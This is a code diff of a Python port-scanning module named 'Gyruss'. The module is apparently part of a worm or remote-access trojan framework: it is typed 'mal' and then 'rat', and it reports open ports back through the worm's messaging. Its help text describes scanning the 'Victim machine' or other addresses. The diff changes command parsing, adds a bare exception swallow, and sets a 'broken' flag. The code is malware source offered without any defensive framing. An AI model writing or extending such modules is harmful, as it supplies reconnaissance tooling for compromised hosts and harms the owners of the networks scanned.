@@ -1,14 +1,14 @@
 #!name##Gyruss
 #!types##module
 #!info##Performs a simple TCP scan using the socket module in the specified port range.
-
+#!broken_FLAG##True
 
 import socket
 import threading
 from typing import Union
 
 class Gyruss:
-    MTYPES = "mal"
+    MTYPES = "rat"
     def __init__(self, worm: object):
         self.worm = worm
         self.opened_port = []
@@ -62,25 +62,21 @@ class Gyruss:
             s.join()
         self.worm.send_msg(f"Scan Complete. Opened ports: {self.opened_port}")
     
-    def scanning(self, data: str) -> None:
-        data = data.split(":")
-        if len(data) < 3:
-            return
-        self._scanning(f"{data[1]}:{data[2]}", data[0])
+    def scanning(self, data: list) -> None:
+        try:
+            self._scanning(f"{data[1]}:{data[2]}", data[0])
+        except:
+            pass
     
-    def exec_cmd(self, cmd: dict) -> None:
-        com = cmd.get("cmd")
-        if not com:
-            return
-        match com:
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
             case "gyrus_scan":
-                self.scanning(cmd.get("data"))
+                self.scanning(cmd[1:])
     
     def help(self) -> str:
-        h = "\n-------- Gyruss Module Help --------\n"
-        h += f"{'-- gyrus_scan <ip>:<port>:<port>':<40}- Starts scanning ports from the specified range.\n"
-        h += f"{'':<40}- Sheme: ip_addr:port_num:port_num   Ex: 192.168.1.1:1000:5500\n"
-        h += f"{'':<40}- Sheme: 0:port_num:port_num   Scaning Victim machine\n"
+        h = "'gyrus_scan <ip>:<port>:<port>' - Starts scanning ports from the specified range.\n"
+        h += "\tEx: 192.168.1.1:1000:5500\n"
+        h += "'gyrus_scan 0:port_num:port_num' - Scaning Victim machine\n"
         return h
 
     def start(self) -> None:
